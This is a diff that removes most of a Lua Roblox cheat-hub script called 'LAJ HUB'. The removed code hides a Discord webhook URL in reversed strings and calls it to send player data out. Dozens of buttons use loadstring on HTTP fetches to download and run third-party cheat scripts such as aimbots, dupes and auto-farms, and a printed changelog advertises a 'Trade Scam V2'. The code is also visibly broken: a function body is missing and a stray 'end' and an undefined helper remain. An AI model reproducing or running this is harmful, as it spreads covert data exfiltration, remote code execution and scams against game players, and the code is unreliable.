-local LocalPlayer = Players.LocalPlayer or {Name = "TestUser", UserId = 0}
-local HttpService = game and game:GetService("HttpService") or {
-    JSONEncode = function(_, data) return '{"mock":"json"}' end
-}
-
--- Support for multiple executors including Swift
-local function makeHttpRequest(options)
-    -- For testing in standalone Lua
-    if not game then
-        print("Mock HTTP request: " .. options.Url)
-        return {Success = true, Body = "-- mock response"}
-    end
-    
-    if swift and swift.request then
-        return swift.request(options)
-    elseif syn and syn.request then
-        return syn.request(options)
-    elseif http and http.request then
-        return http.request(options)
-    elseif http_request then
-        return http_request(options)
-    elseif request then
-        return request(options)
-    elseif httprequest then
-        return httprequest(options)
-    elseif fluxus and fluxus.request then
-        return fluxus.request(options)
-    end
-    
-    -- Fallback to standard HttpGet for GET requests
-    if options.Method == "GET" then
-        local success, result = pcall(function()
-            return {
-                Body = game:HttpGet(options.Url),
-                Success = true
-            }
-        end)
-        if success then
-            return result
-        end
-    end
-    
-    return {Success = false, StatusCode = 500}
-end
-
-
--- Enhanced security with multi-layer obfuscation for Discord webhook
-local discord_wh_part1 = string.reverse("vU0MO0apK8n_EV8DFey8mRZ1n2EbQ0A6INk1BijArT7j8xq")
-local discord_wh_part2 = string.reverse("GH3UWHs7ncpUr7We000sz/4181534603923897531/skoohbew/ipa/moc.drocsid//:sptth")
-local DISCORD_WEBHOOK_URL = discord_wh_part1 .. discord_wh_part2
-
-end
-
-if game then
-    sendUsageData()
-end
-
-local Window = Rayfield:CreateWindow({
-   Name = "LAJ HUB",
-   Icon = 0,
-   LoadingTitle = "LAJ HUB",
-   LoadingSubtitle = "Premium Scripts",
-   Theme = "Default",
-
-   DisableRayfieldPrompts = false,
-   DisableBuildWarnings = false,
-
-   ConfigurationSaving = {
-      Enabled = true,
-      FolderName = "LAJHub",
-      FileName = "LAJHubConfig"
-   },
-
-   Discord = {
-      Enabled = true,
-      Invite = "4mgdcfvAJU",
-      RememberJoins = true
-   },
-
-   -- Key system disabled
-   KeySystem = false,
-})
-
--- Create tabs
-local MainTab = Window:CreateTab("Main", 4483362458)
-local Tab = Window:CreateTab("Da Strike x Da Hood", 4483362458)
-local Fin = Window:CreateTab("Fisch", 4483362458)
-local BballZero = Window:CreateTab("Basketball Zero", 4483362458)
-local BlueLock = Window:CreateTab("Blue Lock Rivals", 4483362458)
-local DeadRails = Window:CreateTab("Dead Rails [Alpha]", 4483362458)
-local BloxFruits = Window:CreateTab("Blox Fruits", 4483362458)
-local PetSim99 = Window:CreateTab("Pet Sim 99", 4483362458) -- Added Pet Sim 99 tab
-local MuscleLegend = Window:CreateTab("Muscle Legend", 4483362458) -- Added Muscle Legend tab
-local Rivals = Window:CreateTab("Rivals", 4483362458) -- Added Rivals tab
-local Universal = Window:CreateTab("Universal", 4483362458)
-local Settings = Window:CreateTab("Settings", 4483362458)
-
-local function executednotify(scriptName)
-   Rayfield:Notify({
-       Title = scriptName,
-       Content = "Script loaded successfully!",
-       Duration = 3,
-       Image = 4483362458,
-   })
-end
-
--- Discord link copy button
-MainTab:CreateButton({
-   Name = "Copy Discord Link",
-   Callback = function()
-       if setclipboard then
-           setclipboard("https://discord.gg/4mgdcfvAJU")
-           Rayfield:Notify({
-               Title = "Discord Link Copied",
-               Content = "Invite link copied to clipboard!",
-               Duration = 3,
-               Image = 4483362458,
-           })
-       else
-           print("Discord link: https://discord.gg/4mgdcfvAJU")
-       end
-   end,
-})
-
--- Test webhook button
-MainTab:CreateButton({
-   Name = "Test Webhook",
-   Callback = function()
-       sendUsageData()
-       Rayfield:Notify({
-           Title = "Webhook Test",
-           Content = "Attempted to send webhook notification!",
-           Duration = 3,
-           Image = 4483362458,
-       })
-   end,
-})
-
--- Da Strike x Da Hood Tab scripts
-Tab:CreateButton({
-   Name = "Psalm",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/NewWhitelistService/l/refs/heads/main/psalms%20old.lua"))()
-        executednotify("Test Webhook")
-   end,
-})
-
-Tab:CreateButton({
-   Name = "Ballware vfs",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/DHBCommunity/DHBOfficialScript/refs/heads/main/Protected_4021809531880627.txt"))()
-        executednotify("Ballware vfs")
-   end,
-})
-
-Tab:CreateButton({
-   Name = "FrostByte",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/Totocoems/Frostbyte-/main/Frostbyte%20leak"))()
-        executednotify("FrostByte")
-   end,
-})
-
-Tab:CreateButton({
-   Name = "Da Hood Script",
-   Callback = function()
-        loadstring(game:HttpGet('https://raw.githubusercontent.com/Zinzs/luascripting/main/canyoutellitsadahoodscriptornot.lua'))()
-        executednotify("Da Hood Script")
-   end,
-})
--- Fisch Tab
-Fin:CreateButton({
-   Name = "Speed Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua"))()
-        executednotify("Speed Hub")
-   end,
-})
-
-
-Fin:CreateButton({
-   Name = "ThanHub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/thantzy/thanhub/refs/heads/main/thanv1"))()
-        executednotify("ThanHub")
-   end,
-})
-
-Fin:CreateButton({
-   Name = "Rift GUI",
-   Callback = function()
-        loadstring(getHttpRequest("https://github.com/Synergy-Networks/products/raw/main/Rift/loader.lua"))()
-        executednotify("Rift GUI")
-   end,
-})
-
-Fin:CreateButton({
-   Name = "Hooked Script",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/Superman245/sc2/refs/heads/main/s6"))()
-        executednotify("Hooked Script")
-   end,
-})
-
-Fin:CreateButton({
-   Name = "HomoHack",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/dementiaenjoyer/homohack/main/loader.lua"))()
-        executednotify("HomoHack")
-   end,
-})
-
-Fin:CreateButton({
-   Name = "Native Hub",
-   Callback = function()
-        script_key="4JxQ1x@+1"
-        loadstring(getHttpRequest("https://getnative.cc/script/loader"))()
-        executednotify("Native Hub")
-   end,
-})
-
-Fin:CreateButton({
-   Name = "Raito Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/Efe0626/RaitoHub/refs/heads/main/Script"))()
-        executednotify("Raito Hub")
-   end,
-})
-
-Fin:CreateButton({
-   Name = "Zenith Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/Efe0626/ZenithHub/refs/heads/main/Loader"))()
-        executednotify("Zenith Hub")
-   end,
-})
-
-Fin:CreateButton({
-   Name = "Lunor Script",
-   Callback = function()
-        script_key = 'lunor_free_key'
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/Just3itx/Lunor-Loadstrings/refs/heads/main/Loader"))()
-        executednotify("Lunor Script")
-   end,
-})
-
-Fin:CreateButton({
-   Name = "Ronix Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/4a8848fbc1047bcc62c49e797384e9ab.lua"))()
-        executednotify("Ronix Hub")
-   end,
-})
--- Basketball Zero script with bypass
-BballZero:CreateButton({
-   Name = "Ball Control",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/laj_hub_test.lua"))()
-        executednotify("Ball Control")
-   end,
-})
-
--- Blue Lock Rivals script
-BlueLock:CreateButton({
-   Name = "LAJ HUB",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/bluelocklajhub/refs/heads/main/blue_lock_mod.lua"))()
-        executednotify("LAJ HUB")
-   end,
-})
-
-BlueLock:CreateButton({
-   Name = "Piskasiska Script",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/Piskasiska22222/tester/refs/heads/main/test"))()
-        executednotify("Piskasiska Script")
-   end,
-})
-
-
-PetSim99:CreateButton({
-   Name = "LAJ HUB",
-   Callback = function()
-       -- Load the script from GitHub
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/pet%20simx"))()
-       executednotify("Airflow UPDATED")
-   end,
-})
--- Muscle Legend Tab
-MuscleLegend:CreateSection("Muscle Legend Scripts")
-
-MuscleLegend:CreateButton({
-   Name = "Muscle Legend Script",
-   Callback = function()
-       loadstring(game:HttpGet(("https://raw.githubusercontent.com/ahmadsgamer2/Script--Game/main/Muscle-Legends"),true))()
-       executednotify("Muscle Legend Script")
-   end,
-})
-
--- Universal Tab Scripts
-Universal:CreateButton({
-   Name = "Infinite Yield FE",
-   Callback = function()
-       loadstring(getHttpRequest('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
-       executednotify("Infinite Yield FE")
-   end,
-})
-
-Universal:CreateButton({
-   Name = "Dex Explorer",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/scriptlx/refs/heads/main/dex.lua"))()
-       executednotify("Dex Explorer")
-   end,
-})
-
-Universal:CreateButton({
-   Name = "Hydroxide",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/xChaoticVoid/Hydroxide/main/beta.lua"))()
-       executednotify("Hydroxide")
-   end,
-})
-
-Universal:CreateButton({
-   Name = "SimpleSpy",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua"))()
-       executednotify("SimpleSpy")
-   end,
-})
-
-Universal:CreateButton({
-   Name = "LAJ HUB",
-   Callback = function()
-       loadstring(getHttpRequest('https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source'))()
-       executednotify("Airflow UPDATED")
-   end,
-})
-
-Universal:CreateButton({
-   Name = "Domain X",
-   Callback = function()
-       loadstring(getHttpRequest('https://raw.githubusercontent.com/shlexware/DomainX/main/source'))()
-       executednotify("Domain X")
-   end,
-})
-
-
--- Settings Tab
-local idled_Connection
-
-local function onIdled()
-    if game then
-        game:GetService("VirtualUser"):CaptureController()
-        game:GetService("VirtualUser"):ClickButton2(Vector2.new(0, 0))
-    end
-end
-
-Settings:CreateButton({
-    Name = "Anti AFK",
-    Callback = function()
-        if game and not idled_Connection and game.Players.LocalPlayer.Idled then
-            idled_Connection = game.Players.LocalPlayer.Idled:Connect(onIdled)
-            executednotify("Anti AFK")
-        end
-    end,
-})
-
-local Inf_jump = false
-local jumpConnection = nil
-
-Settings:CreateToggle({
-   Name = "Infinite Jump",
-   CurrentValue = false,
-   Callback = function(Value)
-      Inf_jump = Value
-      
-      -- Disconnect previous connection if it exists
-      if jumpConnection then
-          jumpConnection:Disconnect()
-          jumpConnection = nil
-      end
-      
-      -- Only create a new connection if Inf_jump is enabled and in game environment
-      if Inf_jump and game then
-          jumpConnection = game:GetService("UserInputService").JumpRequest:Connect(function()
-             if Inf_jump and game.Players.LocalPlayer.Character then
-                game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-             end
-          end)
-      end
-   end,
-})
-
--- Credit section
-local creditSection = MainTab:CreateSection("Credits")
-
-MainTab:CreateLabel("Created by LAJ Hub Team")
-MainTab:CreateLabel("Discord: discord.gg/4mgdcfvAJU")
-MainTab:CreateLabel("Script Version: 4.1 (Swift Compatible)")
-MainTab:CreateLabel("* Optimized for Swift Executor")
-
--- Print Swift compatibility notice
-print("LAJ HUB - Swift Compatible Version")
-print("All HTTP requests have been optimized for Swift executor")
-print("This version includes:")
-print("1. Full Swift compatibility")
-print("2. Pet Sim 99 Tab with new Trade Scam V2")
-print("3. All scripts updated to work with Swift")
-print("4. Improved executor detection")
-
--- Rivals Tab
-Rivals:CreateSection("Rivals Scripts")
-
-Rivals:CreateButton({
-   Name = "RIVALS Winter",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/SkibidiCen/MainMenu/main/Code"))()
-        executednotify("RIVALS Winter")
-   end,
-})
-
-Rivals:CreateButton({
-   Name = "Azure Mod",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/Actyrn/Scripts/main/AzureModded"))()
-        executednotify("Azure Mod")
-   end,
-})
-
-Rivals:CreateButton({
-   Name = "Tbao Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubRivals"))()
-        executednotify("Tbao Hub")
-   end,
-})
-
-Rivals:CreateButton({
-   Name = "8Bits Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/8bits4ya/rivals-v3/refs/heads/main/main.lua"))()
-        executednotify("8Bits Hub")
-   end,
-})
-
-Rivals:CreateButton({
-   Name = "Venox Hub",
-   Callback = function()
-        loadstring(getHttpRequest('https://raw.githubusercontent.com/venoxhh/universalscripts/main/rivals/venoxware'))()
-        executednotify("Venox Hub")
-   end,
-})
-
-Rivals:CreateButton({
-   Name = "Lunax Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/Alexisisback/Lunax/refs/heads/main/Loader.lua"))()
-        executednotify("Lunax Hub")
-   end,
-})
-
-Rivals:CreateButton({
-   Name = "Ventures.lua",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/laeraz/ventures/refs/heads/main/rivals.lua"))()
-        executednotify("Ventures.lua")
-   end,
-})
-
-Rivals:CreateButton({
-   Name = "Ronix Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/b581d07bfd134ff4ea612d671361be77.lua"))()
-        executednotify("Ronix Hub")
-   end,
-})
-
-Rivals:CreateButton({
-   Name = "PinguinRVS",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/PUSCRIPTS/PINGUIN/refs/heads/main/RivalsV1"))()
-        executednotify("PinguinRVS")
-   end,
-})
-
-Rivals:CreateButton({
-   Name = "Zypherion",
-   Callback = function()
-        loadstring(getHttpRequest(('https://raw.githubusercontent.com/blackowl1231/ZYPHERION/refs/heads/main/main.lua')))()
-        executednotify("Zypherion")
-   end,
-})
-
-Rivals:CreateButton({
-   Name = "Auto Farm Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/212c1198a1beacf31150a8cf339ba288.lua"))()
-        executednotify("Auto Farm Hub")
-   end,
-})
-
-Rivals:CreateButton({
-   Name = "Rybow Aimbot",
-   Callback = function()
-        loadstring(getHttpRequest('https://raw.githubusercontent.com/rybowe/rybowescripts/main/release.lua'))()
-        executednotify("Rybow Aimbot")
-   end,
-})
-
-Rivals:CreateButton({
-   Name = "Xera Script",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/luascriptsROBLOX/Xerar/refs/heads/main/RivalsxeraPBF"))()
-        executednotify("Xera Script")
-   end,
-})
-
-Rivals:CreateButton({
-   Name = "Minimal Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/MinimalScriptingService/MinimalRivals/main/rivals.lua",true))()
-        executednotify("Minimal Hub")
-   end,
-})
--- Dead Rails Tab
-DeadRails:CreateSection("Dead Rails Scripts")
-
-DeadRails:CreateButton({
-   Name = "Markk Keyless",
-   Callback = function()
-       loadstring(getHttpRequest('https://raw.githubusercontent.com/Markklol/aw/refs/heads/main/Protected/DRailsv2.lua'))()
-       executednotify("Markk Keyless")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Farx11122 Keyless",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/Farx11122/Dupess/main/SecondDupe"))()
-       executednotify("Farx11122 Keyless")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "SpiderXHub Keyless",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/SpiderScriptRB/Dead-Rails-SpiderXHub-Script/refs/heads/main/SpiderXHub%202.0.txt"))()
-       executednotify("SpiderXHub Keyless")
-   end,
-})
-DeadRails:CreateButton({
-   Name = "Strelizia Keyless",
-   Callback = function()
-       loadstring(getHttpRequest('https://raw.githubusercontent.com/0vma/Strelizia/refs/heads/main/Standalone/DeadRails.lua', true))()
-       executednotify("Strelizia Keyless")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Rinns Dead Rails No Key",
-   Callback = function()
-       loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/e1cfd93b113a79773d93251b61af1e2f.lua"))()
-       executednotify("Rinns Dead Rails No Key")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Auto Farm Bond",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/Emplic/deathrails/refs/heads/main/bond"))()
-       executednotify("Auto Farm Bond")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Lomu Hub",
-   Callback = function()
-       loadstring(getHttpRequest('https://raw.githubusercontent.com/notyourfavorite1/lomuhubmain/refs/heads/main/main.txt', true))()
-       executednotify("Lomu Hub")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Neox Hub",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/hassanxzayn-lua/NEOXHUBMAIN/refs/heads/main/loader", true))()
-       executednotify("Neox Hub")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Sypher Hub OP",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/nocturnal631/Dead-ra/refs/heads/main/Mmm"))()
-       executednotify("Sypher Hub OP")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Tbao Hub",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/tbao143/thaibao/refs/heads/main/TbaoHubDeadRails"))()
-       executednotify("Tbao Hub")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Karol Hub",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/Karolmn9900/karolhub/refs/heads/main/script"))()
-       executednotify("Karol Hub")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "Dead Rails Alpha Script",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/gumanba/Scripts/refs/heads/main/DeadRails", true))()
-       executednotify("Dead Rails Alpha Script")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "LAJ HUB",
-   Callback = function()
-       loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/255ac567ced3dcb9e69aa7e44c423f19.lua"))()
-       executednotify("Airflow UPDATED")
-   end,
-})
-
-DeadRails:CreateButton({
-   Name = "LAJ HUB",
-   Callback = function()
-       loadstring(getHttpRequest("https://raw.githubusercontent.com/InfernusScripts/Null-Fire/main/Loader"))()
-       executednotify("Airflow UPDATED")
-   end,
-})
-
--- BloxFruits Tab Scripts
-BloxFruits:CreateSection("Blox Fruits Scripts")
-
-BloxFruits:CreateButton({
-   Name = "Wolf Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://link.trwxz.com/LS-Wolf-Hub"))()
-        executednotify("Wolf Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "RIPPER Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/hajibeza/Module/main/Mobile_Script.lua"))()
-        executednotify("RIPPER Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "THUNDER Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/ThunderZ-HUB/HUB/main/RemakeMobileTest"))()
-        executednotify("THUNDER Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "MATSUNE Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/Yatsuraa/Matsune/main/Matsunebeta.lua"))()
-        executednotify("MATSUNE Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "MIN SEAGATE Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/CheemsNhuChiAl/MinGamingHub/main/mingamingupdatenew"))()
-        executednotify("MIN SEAGATE Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "ZINER Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/Tienvn123tkvn/Test/main/ZINERHUB.lua"))()
-        executednotify("ZINER Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "MUXUS Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/MuxusTL/BloxFruits/main/MuxusHub_V2.lua"))()
-        executednotify("MUXUS Hub")
-   end,
-})
-
-
-BloxFruits:CreateButton({
-   Name = "Uranium Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/Augustzyzx/UraniumMobile/main/UraniumKak.lua"))()
-        executednotify("Uranium Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "Azure Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua"))()
-        executednotify("Azure Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "Vector Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/Tuxoz/VectorHub/main/BloxFruitPC%26MOBILE"))()
-        executednotify("Vector Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "Wolf Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://link.trwxz.com/LS-Wolf-Hub"))()
-        executednotify("Wolf Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "Payback Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/Script-Blox/Script/main/PayBack.lua"))()
-        executednotify("Payback Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "RIPPER Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/hajibeza/Module/main/Mobile_Script.lua"))()
-        executednotify("RIPPER Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "KAY Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/AXCScript/KayMobile/main/Script-Loader"))()
-        executednotify("KAY Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "SEAGATE Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/SeaBabyBF/seamain/main/SeaGateNextGenz"))()
-        executednotify("SEAGATE Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "MATSUNE Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/Yatsuraa/Matsune/main/Matsunebeta.lua"))()
-        executednotify("MATSUNE Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "MIN SEAGATE Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/CheemsNhuChiAl/MinGamingHub/main/mingamingupdatenew"))()
-        executednotify("MIN SEAGATE Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "ZINER Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/Tienvn123tkvn/Test/main/ZINERHUB.lua"))()
-        executednotify("ZINER Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "MUXUS Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/MuxusTL/BloxFruits/main/MuxusHub_V2.lua"))()
-        executednotify("MUXUS Hub")
-   end,
-})
-
-BloxFruits:CreateButton({
-   Name = "MIN GREEN Hub",
-   Callback = function()
-        loadstring(getHttpRequest("https://raw.githubusercontent.com/Basicallyybeta/main/main/Mingaming.lua"))()
-        executednotify("MIN GREEN Hub")
-   end,
-})
+-- Start the key system
+startKeySystem()
